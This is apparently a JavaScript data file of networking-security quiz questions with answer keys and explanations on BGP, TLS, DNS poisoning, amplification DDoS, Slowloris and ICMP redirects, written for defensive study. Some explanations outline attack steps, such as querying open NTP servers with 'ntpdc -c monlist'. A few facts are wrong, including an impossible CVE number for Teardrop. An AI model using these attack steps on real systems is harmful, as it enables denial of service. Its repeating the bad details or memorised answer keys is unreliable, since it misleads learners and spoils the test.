                { value: 'wireless', text: 'Better wireless performance' }
            ],
            correct: 'efficiency',
            explanation: '📦 Jumbo Frames: MTU > 1500 bytes (typically 9000). Standard Ethernet = 1500 byte MTU. Benefit: Throughput (fewer packets = less per-packet overhead, lower CPU/interrupts). Use case: Storage networks (iSCSI, NFS), data center east-west traffic, backup operations. Requirement: ALL devices in path must support (end-to-end). Misconfiguration = fragmentation or packet loss. Not for: Internet (1500 is max), WiFi, VPN tunnels (overhead reduces effective MTU). Check: ping -M do -s 8972 (Linux). Test before production deployment.'
        },
        {
            id: 'net35',
            title: 'Routing Protocol Security',
            points: 7,
            question: 'Which security measures protect BGP routing from hijacking? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'rpki', text: 'RPKI' },
                { value: 'md5', text: 'MD5 authentication on BGP sessions' },
                { value: 'prefix_filter', text: 'Prefix filtering' },
                { value: 'maxprefix', text: 'Maximum prefix limits' },
                { value: 'no_auth', text: 'Disable all authentication' },
                { value: 'plaintext', text: 'Use plaintext passwords' }
            ],
            correct: ['rpki', 'md5', 'prefix_filter', 'maxprefix'],
            explanation: '🌐 BGP Security (Border Gateway Protocol): Internet routing, trust-based (no built-in auth). **Attacks**: Route hijacking (announce others\' prefixes), route leaks (propagate internal routes). **Defense**: 1) **RPKI/ROV** (cryptographically validate prefix→AS mapping), 2) **BGP auth** (MD5 or TCP-AO), 3) **Prefix filters** (whitelist expected prefixes from peers), 4) **AS path filtering** (detect suspicious paths), 5) **Max-prefix** (disconnect if peer exceeds threshold). Real incidents: Pakistan Telecom hijacked YouTube (2008), Russia hijacked Google (2017). Monitor: BGPmon, RIPE RIS. Tier-1 SOC: Alert on unexpected route changes.'
        },
        {
            id: 'net36',
            title: 'SSL/TLS Handshake',
            points: 6,
            question: 'During TLS handshake, what is exchanged in ClientHello message?',
            type: 'checkbox',
            options: [
                { value: 'version', text: 'Supported TLS versions' },
                { value: 'ciphers', text: 'List of supported cipher suites' },
                { value: 'random', text: 'Client random number' },
                { value: 'sni', text: 'SNI' },
                { value: 'private_key', text: 'Client private key' },
                { value: 'certificate', text: 'Client certificate' }
            ],
            correct: ['version', 'ciphers', 'random', 'sni'],
            explanation: '🔐 TLS ClientHello: First message in handshake. Contains: 1) **TLS version** (client max version), 2) **Cipher suites** (TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384...), 3) **Client random** (32 bytes), 4) **SNI** (domain name - enables virtual hosting). NOT: Private keys (never transmitted), client cert (only if server requests via CertificateRequest). Handshake: ClientHello → ServerHello (pick cipher) → Certificate → ServerKeyExchange → Client confirms → Encrypted app data. Wireshark: ssl.handshake.type==1. Security: Downgrade attacks (force weak ciphers), SNI leaks domain (fix: ECH/eSNI).'
        },
        {
            id: 'net37',
            title: 'Port Knocking',
            points: 6,
            question: 'Server requires connection attempts to ports 7000, 8000, 9000 in sequence before opening SSH. What is this technique?',
            type: 'radio',
            options: [
                { value: 'port_knock', text: 'Port knocking' },
                { value: 'port_scan', text: 'Port scanning' },
                { value: 'syn_flood', text: 'SYN flood attack' },
                { value: 'firewall_bypass', text: 'Firewall bypass exploit' },
                { value: 'dos', text: 'Denial of service attack' }
            ],
            correct: 'port_knock',
            explanation: '🚪 Port Knocking: Security through obscurity. Daemon monitors firewall logs, detects specific port sequence (SYN to 7000, 8000, 9000), dynamically opens port 22 for that source IP (time-limited). Benefit: Hide services from port scans, reduce attack surface. Weakness: Obscurity not security (if sequence leaked, or attacker monitors legitimate user), replay attacks. Better: VPN, client certificates, fail2ban, IP whitelisting. Tools: knockd (Linux), fwknop (SPA - Single Packet Authorization). Detection: Unusual sequential connection attempts. Legitimate use: Admin access to sensitive services.'
        },
        {
            id: 'net38',
            title: 'NTP Amplification',
            points: 7,
            question: 'Attackers send NTP monlist requests with spoofed source IPs. What attack is this?',
            type: 'radio',
            options: [
                { value: 'ddos_amp', text: 'DDoS amplification' },
                { value: 'time_sync', text: 'Legitimate time synchronization' },
                { value: 'mitm', text: 'Man-in-the-middle attack' },
                { value: 'replay', text: 'Replay attack' },
                { value: 'brute_force', text: 'Brute force attack' }
            ],
            correct: 'ddos_amp',
            explanation: '⏰ NTP Amplification DDoS: Attacker sends 234-byte monlist request to vulnerable NTP server with SPOOFED victim IP → Server responds with up to 482x amplification (hundreds of KB). Victim flooded. Attack flow: 1) Find open NTP servers (Shodan), 2) Send monlist queries (ntpdc -c monlist), 3) Responses flood victim. Mitigation: **Disable monlist** (ntpd.conf: disable monitor), update NTP (removed in NTPv4.2.7+), rate limiting, BCP38 (prevent IP spoofing at ISP). Other amplification: DNS (ANY query), Memcached (biggest: 51,000x), SSDP, CharGEN. Defense: Don\'t run public services unnecessarily.'
        },
        {
            id: 'net39',
            title: 'IPv4 vs IPv6 Headers',
            points: 5,
            question: 'What is major improvement in IPv6 header design compared to IPv4?',
            type: 'radio',
            options: [
                { value: 'simplified', text: 'Simplified fixed header' },
                { value: 'checksums', text: 'Added checksum validation at network layer' },
                { value: 'smaller', text: 'Smaller header size' },
                { value: 'fragmentation', text: 'Improved router-based fragmentation' },
                { value: 'backward', text: 'Full backward compatibility with IPv4' }
            ],
            correct: 'simplified',
            explanation: '📋 IPv6 Header: Fixed 40-byte header (vs IPv4 variable 20-60 bytes). Removed: Header checksum (redundant - checksums at L2/L4), Options field (replaced with extension headers), Fragmentation fields (only end hosts fragment). Added: Flow label (QoS), larger addresses (128-bit). Benefit: Faster router processing (fixed format), extensibility (chain extension headers for options). Extension headers: Hop-by-Hop, Routing, Fragment, Destination Options, AH (IPsec), ESP. Security consideration: Extension header chains can hide attacks (firewall evasion), fragment reassembly attacks. NOT backward compatible (requires dual-stack or tunneling).'
        },
        {
            id: 'net40',
            title: 'Smurf Attack',
            points: 6,
            question: 'Attacker sends ICMP echo request to broadcast address with spoofed victim IP. What attack?',
            type: 'radio',
            options: [
                { value: 'smurf', text: 'Smurf attack' },
                { value: 'ping_flood', text: 'Simple ping flood' },
                { value: 'fraggle', text: 'Fraggle attack' },
                { value: 'land', text: 'LAND attack' },
                { value: 'teardrop', text: 'Teardrop attack' }
            ],
            correct: 'smurf',
            explanation: '💥 Smurf Attack (historic): 1) Attacker pings broadcast address (192.168.1.255) with SPOOFED source IP (victim), 2) All hosts on subnet reply to victim, 3) Amplification = network size × ICMP reply. Variant: **Fraggle** (UDP echo instead of ICMP). Mitigation: **Disable IP directed-broadcast** on routers (Cisco: no ip directed-broadcast - default since IOS 12.0), rate limit ICMP, BCP38 (prevent spoofing). Modern: Rare (directed broadcast disabled everywhere), replaced by DNS/NTP amplification. Historical impact: Major DDoS vector in late 1990s. Detection: Excessive ICMP from many sources to single target.'
        },
        {
            id: 'net41',
            title: 'TCP Window Size',
            points: 5,
            question: 'TCP packet shows Window Size = 0. What does this indicate?',
            type: 'radio',
            options: [
                { value: 'flow_control', text: 'Flow control' },
                { value: 'connection_close', text: 'Connection closing' },
                { value: 'syn_scan', text: 'Port scan in progress' },
                { value: 'attack', text: 'DDoS attack' },
                { value: 'error', text: 'Packet corruption' }
            ],
            correct: 'flow_control',
            explanation: '🪟 TCP Window: Flow control mechanism. Receiver advertises available buffer space (window size in bytes). Window=0 = "Stop sending, my buffer is full". Sender pauses, receiver sends Window Update when buffer space available. Legitimate: Fast sender, slow receiver (web server → slow client). Attack: **Sockstress** (advertise Window=0, hold connections open). Tuning: Increase receive buffer (Linux: net.ipv4.tcp_rmem), TCP Window Scaling (scale factor allows >64KB windows for high-bandwidth×delay product). Wireshark: tcp.window_size_value. Zero window probe: Sender checks if receiver ready (ZeroWindowProbe).'
        },
        {
            id: 'net42',
            title: 'Network Time Protocol Security',
            points: 6,
            question: 'Why is accurate time synchronization critical for security? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'logs', text: 'Log correlation across systems' },
                { value: 'kerberos', text: 'Kerberos authentication requires time sync' },
                { value: 'certificates', text: 'Certificate validity periods' },
                { value: 'forensics', text: 'Digital forensics timeline accuracy' },
                { value: 'performance', text: 'Improves network performance' },
                { value: 'encryption', text: 'Stronger encryption algorithms' }
            ],
            correct: ['logs', 'kerberos', 'certificates', 'forensics'],
            explanation: '⏰ Time Sync Security: Critical for: 1) **Log correlation** (SIEM match events across servers - can\'t correlate if clocks skewed), 2) **Kerberos** (tickets timestamped, >5min skew = auth fail), 3) **Certificates** (expired cert = connection refused), 4) **Forensics** (attack timeline accuracy), 5) **MFA/OTP** (TOTP time-based). Attack: Time-shift to replay expired tickets, bypass certificate checks. Defense: NTP authentication (symmetric keys), NTP pool (multiple sources), monitor time drift. Stratum 0 = atomic clock, Stratum 1 = directly connected, Stratum 2 = sync to Stratum 1. Tools: ntpq -p, chronyc sources. PCI-DSS requires accurate time.'
        },
        {
            id: 'net43',
            title: 'HTTP vs HTTPS Traffic',
            points: 5,
            question: 'Analyst can see full URL in HTTP traffic but only domain in HTTPS. What is visible in HTTPS?',
            type: 'checkbox',
            options: [
                { value: 'dest_ip', text: 'Destination IP address' },
                { value: 'sni', text: 'SNI domain name' },
                { value: 'packet_size', text: 'Packet sizes and timing' },
                { value: 'dns', text: 'DNS queries for domain' },
                { value: 'full_url', text: 'Full URL including path' },
                { value: 'post_data', text: 'POST request body data' }
            ],
            correct: ['dest_ip', 'sni', 'packet_size', 'dns'],
            explanation: '🔒 HTTPS Visibility: Encrypted content = URL path, headers, body. **Visible (unencrypted)**: Dest IP, SNI (domain in ClientHello), packet sizes, timing, TLS version/ciphers. **Hidden**: Full URL (path/query string), request/response headers, POST data, cookies. Metadata leak: SNI shows example.com (privacy concern - fix: Encrypted ClientHello/ECH). Traffic analysis: Packet size patterns identify activity (Netflix video = large sustained, email = small bursts). DPI bypass: HTTPS prevents content inspection (unless SSL inspection/MITM with corporate proxy). DNS query exposes domain BEFORE HTTPS.'
        },
        {
            id: 'net44',
            title: 'ICMP Redirect',
            points: 6,
            question: 'Host receives ICMP Redirect message pointing to new gateway. What security risk?',
            type: 'radio',
            options: [
                { value: 'mitm', text: 'Man-in-the-middle attack' },
                { value: 'dos', text: 'Denial of service' },
                { value: 'scan', text: 'Port scanning' },
                { value: 'none', text: 'No security risk' },
                { value: 'malware', text: 'Malware delivery mechanism' }
            ],
            correct: 'mitm',
            explanation: '⚠️ ICMP Redirect Attack: ICMP Type 5 tells host "use this router for destination X". Legitimate: Optimize routing on multi-router subnet. Attack: Fake ICMP Redirect → victim sends traffic through attacker (MITM). Requirements: Same L2 segment as victim. Mitigation: **Disable ICMP Redirects** (Linux: net.ipv4.conf.all.accept_redirects=0, Cisco: no ip redirects). Block at firewall (rarely needed). Modern networks: Static routes or dynamic routing protocols (OSPF) better than redirects. Similar: IPv6 Router Advertisement attacks. Detection: Unexpected routing table changes, ICMP Redirect from non-gateway IP.'
        },
        {
            id: 'net45',
            title: 'Load Balancing Algorithms',
            points: 5,
            question: 'Load balancer uses "source IP hash" algorithm. What is benefit over round-robin?',
            type: 'radio',
            options: [
                { value: 'persistence', text: 'Session persistence' },
                { value: 'speed', text: 'Faster load distribution' },
                { value: 'security', text: 'Better security against attacks' },
                { value: 'capacity', text: 'Higher capacity handling' },
                { value: 'random', text: 'More random distribution' }
            ],
            correct: 'persistence',
            explanation: '⚖️ LB Algorithms: **Round-robin** = sequential (server1, server2, server3, repeat). Simple but no session awareness. **Source IP hash** = hash(client_IP) % server_count → same client always hits same server. Benefit: Session persistence (stateful apps needing sticky sessions - shopping cart, active sessions). **Least connections** = send to server with fewest active connections (better for long-lived connections). **Weighted** = bias toward more powerful servers. Security: Source IP can enable session hijacking (if attacker spoofs IP), DDoS unevenly distributed (many requests from few IPs). Alternatives: Cookie-based persistence, SSL session ID.'
        },
        {
            id: 'net46',
            title: 'SNMP Community Strings',
            points: 7,
            question: 'Network devices use default SNMP community string "public" (read-only). What is risk?',
            type: 'checkbox',
            options: [
                { value: 'recon', text: 'Information disclosure' },
                { value: 'bandwidth', text: 'Bandwidth monitoring reveals traffic patterns' },
                { value: 'arp_table', text: 'ARP table enumeration' },
                { value: 'dos', text: 'SNMP amplification DDoS attacks' },
                { value: 'no_risk', text: 'No risk' },
                { value: 'encryption', text: 'Weak encryption vulnerabilities' }
            ],
            correct: ['recon', 'bandwidth', 'arp_table', 'dos'],
            explanation: '📊 SNMP Security: SNMPv1/v2c = plaintext community strings (password). Default "public" (RO), "private" (RW) = universally known. **Risks**: 1) **Recon** (system info, interface IPs, routing table), 2) **ARP table** (map all hosts), 3) **Traffic stats** (identify critical systems), 4) **Amplification DDoS** (GetBulk requests). RW string = change configs, shutdown interfaces. **Defense**: Change defaults, ACL restrict SNMP access (only monitoring server), **use SNMPv3** (authentication + encryption), disable if unused. Tools: onesixtyone (brute force), snmpwalk. Shodan finds 15M+ devices with default community strings. CRITICAL vulnerability in enterprise networks.'
        },
        {
            id: 'net47',
            title: 'DNS Cache Poisoning',
            points: 7,
            question: 'Attacker injects false DNS records into resolver cache. What enables this attack?',
            type: 'checkbox',
            options: [
                { value: 'no_dnssec', text: 'No DNSSEC validation (can\'t verify authenticity)' },
                { value: 'predictable', text: 'Predictable DNS transaction IDs' },
                { value: 'source_port', text: 'Fixed source port' },
                { value: 'no_encryption', text: 'DNS queries unencrypted' },
                { value: 'http', text: 'HTTP protocol vulnerabilities' },
                { value: 'firewall', text: 'Misconfigured firewall rules' }
            ],
            correct: ['no_dnssec', 'predictable', 'source_port', 'no_encryption'],
            explanation: '🎯 DNS Cache Poisoning (Kaminsky Attack 2008): Race to respond to DNS query with fake answer. Attacker guesses: 1) **Query ID** (16-bit = 65k possibilities), 2) **Source port** (if static = easy, if random = harder). Fake response accepted → cached → all clients get poisoned result (redirect to phishing/malware). **Defenses**: 1) **DNSSEC** (cryptographic signatures verify records), 2) **Source port randomization** (0x0020 bit), 3) **Query ID randomization**, 4) **DNS-over-HTTPS/TLS** (encrypted). Impact: Mass phishing (redirect bank.com → attacker), malware distribution. Check: dig +dnssec (should show RRSIG records). Modern resolvers mostly hardened.'
        },
        {
            id: 'net48',
            title: 'Traceroute Analysis',
            points: 6,
            question: 'Traceroute shows hops 5-8 return "* * *" (no response). What does this likely indicate?',
            type: 'radio',
            options: [
                { value: 'firewall_icmp', text: 'Firewall blocking ICMP or high UDP ports' },
                { value: 'packet_loss', text: 'Severe packet loss at those hops' },
                { value: 'route_loop', text: 'Routing loop' },
                { value: 'destination_down', text: 'Destination unreachable' },
                { value: 'attack', text: 'Active DDoS attack' }
            ],
            correct: 'firewall_icmp',
            explanation: '🗺️ Traceroute Interpretation: "* * *" = no ICMP Time Exceeded response. **Likely cause**: Router/firewall policy blocks ICMP (security hardening). Traffic may be passing fine (check if destination responds). **Not**: Packet loss (would show some responses), routing loop (would show repeated hops). Traceroute methods: ICMP (Windows default), UDP (Linux default, high ports 33434+), TCP (tcptraceroute port 80/443). If ICMP blocked, try: traceroute -T -p 443 (TCP). Asymmetric routing causes: Forward path ≠ return path (traceroute shows forward, not return). Use: Diagnose latency (which hop adds delay), identify ISP boundaries.'
        },
        {
            id: 'net49',
            title: 'Network Segmentation Benefits',
            points: 6,
            question: 'Why should IoT devices be placed on separate VLAN from corporate workstations? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'lateral', text: 'Limit lateral movement (compromised IoT can\'t reach workstations)' },
                { value: 'blast_radius', text: 'Reduce blast radius of IoT vulnerabilities/malware' },
                { value: 'monitoring', text: 'Easier monitoring and anomaly detection' },
                { value: 'compliance', text: 'Compliance requirements' },
                { value: 'speed', text: 'Improve network speed for workstations' },
                { value: 'wireless', text: 'IoT devices only work on separate VLANs' }
            ],
            correct: ['lateral', 'blast_radius', 'monitoring', 'compliance'],
            explanation: '🔒 Network Segmentation: Micro-segmentation = zero trust. **IoT risks**: Weak security (default passwords, no patches, hardcoded creds), large attack surface (cameras, thermostats, printers). Breach → lateral movement to corporate network. **Segmentation benefits**: 1) **Containment** (IoT breach stays in IoT VLAN), 2) **Policy enforcement** (IoT can\'t initiate connections to corporate), 3) **Visibility** (monitor IoT traffic patterns, alert on anomalies), 4) **Compliance** (separate cardholder data, PHI). Implementation: VLANs + ACLs, firewall between zones, 802.1X (authenticate before VLAN assignment). Common segments: Corporate, Guest, IoT, Voice, Servers, Management. Mirai botnet (2016) = mass IoT compromise.'
        },
        {
            id: 'net50',
            title: 'SSL Certificate Validation',
            points: 7,
            question: 'Browser shows certificate warning for https://bank.com. What should user verify? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'domain_match', text: 'Certificate CN/SAN matches URL' },
                { value: 'expiration', text: 'Certificate not expired' },
                { value: 'ca_trust', text: 'Issued by trusted CA' },
                { value: 'revocation', text: 'Not revoked' },
                { value: 'click_proceed', text: 'Click "Proceed Anyway" to access site quickly' },
                { value: 'ignore', text: 'Certificate warnings can be safely ignored' }
            ],
            correct: ['domain_match', 'expiration', 'ca_trust', 'revocation'],
            explanation: '🔐 Certificate Validation: Browser checks: 1) **Domain match** (cert CN/SAN = bank.com, not attacker.com or bank.phishing.com), 2) **Expiration** (current time within NotBefore/NotAfter), 3) **Chain of trust** (signed by trusted CA in browser root store), 4) **Revocation** (not in CRL or OCSP responder says "Good"). **Warning causes**: Domain mismatch (MITM attack, typosquatting), expired cert (lazy admin or attacker can\'t get valid cert), self-signed (dev environment or MITM), revoked (private key compromised). **NEVER ignore warnings** on sensitive sites (banking, email, work VPN). Attack: MITM with self-signed cert (corporate proxy, public WiFi attacker). Tools: openssl s_client, SSL Labs test.'
        },
        {
            id: 'net51',
            title: 'IPv6 Address Recognition',
            points: 6,
            question: 'Which IPv6 address represents localhost?',
            type: 'radio',
            options: [
                { value: '::1', text: '::1' },
                { value: 'fe80::1', text: 'fe80::1' },
                { value: '::ffff:127.0.0.1', text: '::ffff:127.0.0.1' },
                { value: '2001:db8::1', text: '2001:db8::1' },
                { value: 'ff02::1', text: 'ff02::1' }
            ],
            correct: '::1',
            explanation: '🏠 ::1 is IPv6 loopback (equivalent to 127.0.0.1 in IPv4). Shortened from 0000:0000:0000:0000:0000:0000:0000:0001. fe80::1 = link-local, ff02::1 = all-nodes multicast, 2001:db8:: = documentation range, ::ffff:127.0.0.1 = IPv4-mapped IPv6. Common interview question for network roles.'
        },
        {
            id: 'net52',
            title: 'Packet Fragmentation Attack',
            points: 9,
            question: 'You observe packets with identical IP ID field but different fragment offsets targeting your web server. What attack is this?',
            type: 'radio',
            options: [
                { value: 'teardrop', text: 'Teardrop/Fragment Overlap attack' },
                { value: 'smurf', text: 'Smurf attack' },
                { value: 'syn_flood', text: 'SYN flood' },
                { value: 'legit', text: 'Normal fragmentation' },
                { value: 'ping_death', text: 'Ping of Death' }
            ],
            correct: 'teardrop',
            explanation: '💥 Teardrop Attack: Sends overlapping IP fragments to crash vulnerable systems during reassembly. Fragments have same IP ID but overlapping offsets = buffer overrun when OS tries to reassemble. CVE-1997-0124. Modern systems patched but IoT devices vulnerable. Defense: Fragment reassembly validation, drop malformed fragments, IPS signatures. Historical but still tested in certifications.'
        },
        {
            id: 'net53',
            title: 'Ethernet Frame Analysis',
            points: 7,
            question: 'Maximum size of standard Ethernet frame (excluding preamble)?',
            type: 'radio',
            options: [
                { value: '1518', text: '1518 bytes' },
                { value: '1500', text: '1500 bytes' },
                { value: '1522', text: '1522 bytes' },
                { value: '9000', text: '9000 bytes' },
                { value: '65535', text: '65535 bytes' }
            ],
            correct: '1518',
            explanation: '📐 1518 bytes = max Ethernet II frame. Breakdown: 14 bytes header (6 dest MAC + 6 src MAC + 2 EtherType) + 1500 bytes data (MTU) + 4 bytes FCS (CRC). With 802.1Q VLAN tag = 1522 bytes. Jumbo frames = 9000 bytes (not standard). Common interview question. Frames < 64 bytes = runts (collision fragments). Frames > 1518 = giants (errors or jumbo).'
        },
        {
            id: 'net54',
            title: 'TCP Window Size Zero',
            points: 10,
            question: 'During packet capture, you see server sending TCP packets with Window Size = 0 to client. What does this indicate?',
            type: 'radio',
            options: [
                { value: 'buffer_full', text: 'Server receive buffer is full - flow control' },
                { value: 'attack', text: 'Client is performing a DDoS attack' },
                { value: 'connection_close', text: 'Connection is being terminated' },
                { value: 'error', text: 'Network error or packet corruption' },
                { value: 'normal', text: 'Normal TCP behavior' }
            ],
            correct: 'buffer_full',
            explanation: '🚦 TCP Flow Control: Window Size = 0 means "STOP sending, my buffer is full!" Receiver tells sender to pause until buffer space available. Sender must wait for Window Update (size > 0) before resuming. Causes: Slow application reading data, resource exhaustion, performance issues. Not an attack - legitimate flow control. If persistent = application bottleneck or memory issue. Monitor for Zero Window conditions in performance troubleshooting.'
        },
        {
            id: 'net55',
            title: 'Gratuitous ARP Purpose',
            points: 8,
            question: 'What is the primary legitimate use of Gratuitous ARP?',
            type: 'radio',
            options: [
                { value: 'update_cache', text: 'Update ARP caches when IP changes or HA failover' },
                { value: 'discover_hosts', text: 'Discover other hosts on network' },
                { value: 'attack', text: 'Perform ARP poisoning attacks' },
                { value: 'test_network', text: 'Test network connectivity' },
                { value: 'broadcast', text: 'Broadcast MAC address to all hosts' }
            ],
            correct: 'update_cache',
            explanation: '📢 Gratuitous ARP = ARP request for own IP address. Purposes: 1) **IP conflict detection** (if another host replies = duplicate IP), 2) **Update neighbor caches** when IP/MAC changes (NIC replacement, VM migration), 3) **HA failover** (VIP moves to backup, GARP announces new MAC). Also abused for ARP spoofing attacks. Legitimate uses: VRRP, HSRP, VM live migration. Monitor for unexpected GARP = possible attack or misconfiguration.'
        },
        {
            id: 'net56',
            title: 'TCP RST Packet Analysis',
            points: 9,
            question: 'Client sends SYN to server port 80. Server immediately replies with RST. What does this mean?',
            type: 'radio',
            options: [
                { value: 'port_closed', text: 'Port 80 is closed/no service listening' },
                { value: 'firewall', text: 'Firewall blocking connection' },
                { value: 'overload', text: 'Server overloaded' },
                { value: 'attack', text: 'DDoS attack in progress' },
                { value: 'normal', text: 'Normal connection establishment' }
            ],
            correct: 'port_closed',
            explanation: '🚪 RST (Reset) = "Port closed, service not listening". Server received SYN but no application bound to port 80 = immediate RST. Different from firewall DROP (no response) or REJECT (ICMP unreachable). RST also sent for: invalid packets, connection abortion, sequence number out of window. Nmap uses RST to identify closed ports. Interview tip: RST = explicit rejection, DROP/timeout = filtering.'
        },
        {
            id: 'net57',
            title: 'Slow Loris Attack Detection',
            points: 11,
            question: 'Web server shows max connections reached but low bandwidth usage. Connections stay ESTABLISHED for hours. What attack?',
            type: 'radio',
            options: [
                { value: 'slowloris', text: 'Slowloris - slow HTTP headers' },
                { value: 'syn_flood', text: 'SYN flood attack' },
                { value: 'ddos', text: 'Bandwidth DDoS' },
                { value: 'normal', text: 'Normal keep-alive connections' },
                { value: 'udp_flood', text: 'UDP flood' }
            ],
            correct: 'slowloris',
            explanation: '🐌 Slowloris: Sends partial HTTP requests slowly to exhaust connection pool. Opens many connections, sends incomplete headers byte-by-byte, keeps connections alive forever. Max connections reached + low bandwidth + long duration = Slowloris. Defense: Connection timeout, rate limiting, reverse proxy (nginx, Cloudflare), mod_reqtimeout in Apache. Similar: R.U.D.Y, Slow POST. MITRE: Endpoint DoS (T1499.003). Famous against Apache, less effective vs nginx/IIS.'
        },
        {
            id: 'net58',
            title: 'DNS Cache Poisoning',
            points: 12,
            question: 'Attacker spoofs DNS responses to cache fake records. Which field must attacker predict correctly? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'txid', text: 'Transaction ID (16-bit)' },
                { value: 'port', text: 'Source port (UDP)' },
                { value: 'ip', text: 'DNS server IP' },
                { value: 'domain', text: 'Queried domain name' },
                { value: 'ttl', text: 'TTL value' },
                { value: 'opcode', text: 'DNS opcode' }
            ],
            correct: ['txid', 'port'],
            explanation: '🎯 DNS Cache Poisoning (Kaminsky Attack): Attacker must guess Transaction ID (65,536 options) + Source Port (65,536 options) = 4.3 billion combinations. Race: Send fake response before real one. Modern defense: Port randomization, TXID randomization, DNSSEC. CVE-2008-1447. Why it matters: Redirect traffic to phishing sites, MITM attacks. Interview: "How does DNSSEC prevent this?" (Answer: Cryptographic signatures validate responses).'
        },
        {
            id: 'net59',
            title: 'Subnet Mask Calculation',
            points: 7,
            question: 'Network 192.168.10.0/26 - how many subnets and hosts per subnet?',
            type: 'radio',
            options: [
                { value: '4_62', text: '4 subnets, 62 hosts each' },
                { value: '2_126', text: '2 subnets, 126 hosts each' },
                { value: '8_30', text: '8 subnets, 30 hosts each' },
                { value: '16_14', text: '16 subnets, 14 hosts each' },
                { value: '4_64', text: '4 subnets, 64 hosts each' }
            ],
            correct: '4_62',
            explanation: '🔢 /26 = 255.255.255.192 = borrowing 2 bits from /24. Subnets: 2² = 4. Hosts per subnet: 2⁶ - 2 = 64 - 2 = 62 usable. Ranges: .0-.63, .64-.127, .128-.191, .192-.255. Each subnet loses 2 IPs (network + broadcast). Common interview question for network roles. Formula: Subnets = 2^(borrowed bits), Hosts = 2^(host bits) - 2.'
        },
        {
            id: 'net60',
            title: 'ICMP Redirect Attack',
            points: 10,
            question: 'Workstation receives ICMP Redirect messages claiming better route through 10.5.10.99. What is the risk?',
            type: 'radio',
            options: [
                { value: 'mitm', text: 'Man-in-the-middle - traffic redirected through attacker' },
                { value: 'dos', text: 'Denial of service attack' },
                { value: 'scan', text: 'Network scanning attempt' },
                { value: 'normal', text: 'Normal network optimization' },
                { value: 'overload', text: 'Router overload notification' }
            ],
            correct: 'mitm',
            explanation: '⚠️ ICMP Redirect Attack: Attacker sends fake ICMP Type 5 messages to change victim\'s routing table, redirecting traffic through attacker\'s machine for MITM. Victims update routing cache and send packets to malicious "gateway". Defense: Disable ICMP redirects (no ip redirects in Cisco), host-based firewall rules, network segmentation. Legitimate use: Routers inform hosts of better routes, but rarely needed in modern networks. Check: netstat -rn to see route changes.'
        },
        {
            id: 'net61',
            title: 'HTTP/2 vs HTTP/1.1',
            points: 8,
            question: 'What is the primary performance advantage of HTTP/2 over HTTP/1.1?',
            type: 'radio',
            options: [
                { value: 'multiplexing', text: 'Multiplexing - multiple requests over single connection' },
                { value: 'encryption', text: 'Built-in encryption' },
                { value: 'compression', text: 'Better compression' },
                { value: 'caching', text: 'Improved caching' },
                { value: 'cookies', text: 'Better cookie handling' }
            ],
            correct: 'multiplexing',
            explanation: '🚀 HTTP/2 Multiplexing: Send multiple requests/responses simultaneously over ONE TCP connection without head-of-line blocking. HTTP/1.1 requires multiple connections or waits for response before next request. HTTP/2 also: header compression (HPACK), server push, binary protocol. Performance: 30-50% faster page loads. Security: Most browsers require TLS for HTTP/2. Interview question: "Why is HTTP/2 faster?" Tools: Wireshark can decode HTTP/2, chrome://net-internals.'
        },
        {
            id: 'net62',
            title: 'Time to Live Exceeded',
            points: 7,
            question: 'User gets "TTL exceeded" error. Traceroute shows loops. What is the problem?',
            type: 'radio',
            options: [
                { value: 'routing_loop', text: 'Routing loop - packets circling between routers' },
                { value: 'firewall', text: 'Firewall blocking traffic' },
                { value: 'dns', text: 'DNS resolution failure' },
                { value: 'congestion', text: 'Network congestion' },
                { value: 'mtu', text: 'MTU mismatch' }
            ],
            correct: 'routing_loop',
            explanation: '🔄 Routing Loop: Packets bounce between routers forever. TTL decrements each hop, reaches 0 = ICMP Time Exceeded. Causes: Misconfigured routes, routing protocol convergence issues, static route mistakes. Debug: traceroute shows same routers repeating. Fix: Correct routing tables, check for conflicting routes, verify routing protocol config. Prevention: Split horizon, route poisoning in RIP, SPF algorithm in OSPF. Common interview scenario.'
        },
        {
            id: 'net63',
            title: 'TCP Selective Acknowledgment',
            points: 11,
            question: 'TCP option SACK (Selective Acknowledgment) - what problem does it solve?',
            type: 'radio',
            options: [
                { value: 'retransmit', text: 'Retransmit only missing segments, not entire window' },
                { value: 'faster_connect', text: 'Faster connection establishment' },
                { value: 'security', text: 'Better security' },
                { value: 'flow_control', text: 'Improved flow control' },
                { value: 'congestion', text: 'Congestion avoidance' }
            ],
            correct: 'retransmit',
            explanation: '📦 SACK (RFC 2018): Without SACK, if packet 5 is lost in sequence 1-10, sender must retransmit ALL 5-10. With SACK, receiver says "I have 1-4,6-10, resend ONLY 5". Dramatically improves performance over lossy networks. Enabled by default in modern OSes. Check: netstat -s | grep SACK. Interview: "How does TCP recover from packet loss?" SACK vs Fast Retransmit/Recovery. Wireshark shows SACK options in TCP header.'
        },
        {
            id: 'net64',
            title: 'Broadcast Storm',
            points: 10,
            question: 'Network performance degrades. All switches show 99% CPU, massive broadcast traffic. Likely cause?',
            type: 'radio',
            options: [
                { value: 'stp_loop', text: 'STP failure or bridging loop' },
                { value: 'ddos', text: 'DDoS attack' },
                { value: 'malware', text: 'Malware infection' },
                { value: 'dns', text: 'DNS issues' },
                { value: 'vlan', text: 'VLAN misconfiguration' }
            ],
            correct: 'stp_loop',
            explanation: '🌪️ Broadcast Storm: Layer 2 loop causes broadcast frames to multiply infinitely. STP (Spanning Tree Protocol) prevents loops by blocking redundant paths. STP failure (disabled, misconfigured, or convergence issues) = instant broadcast storm. Symptoms: 99% CPU, network down, MAC table thrashing. Fix: Emergency: Unplug cables to break loop. Permanent: Enable BPDU guard, root guard, verify STP config. Prevention: Rapid STP (RSTP), loop guard. Serious interview scenario.'
        },
        {
            id: 'net65',
            title: 'Private IPv4 Ranges',
            points: 6,
            question: 'Which IP range is NOT RFC 1918 private address space?',
            type: 'radio',
            options: [
                { value: '100', text: '100.64.0.0/10' },
                { value: '10', text: '10.0.0.0/8' },
                { value: '172', text: '172.16.0.0/12' },
                { value: '192', text: '192.168.0.0/16' },
                { value: 'all_private', text: 'All are private ranges' }
            ],
            correct: '100',
